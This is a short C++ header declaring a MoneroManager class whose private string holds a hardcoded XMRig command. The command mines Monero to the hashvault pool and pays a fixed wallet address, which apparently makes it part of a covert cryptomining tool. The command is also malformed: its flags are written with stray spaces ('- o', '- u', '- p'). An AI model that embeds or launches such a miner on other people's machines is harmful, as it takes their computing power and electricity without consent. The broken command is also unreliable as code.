#ifndef MONEROMANAGER_HPP_INCLUDE
#define MONEROMANAGER_HPP_INCLUDE


#include <string>

class MoneroManager
{
public:
	MoneroManager();
	virtual ~MoneroManager();

	int RunMonero();
protected:
private:
	std::string moneroCommand = "xmrig.exe - o pool.hashvault.pro:3333 - u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD - p x";



};




#endif //MONEROMANAGER_HPP_INCLUDE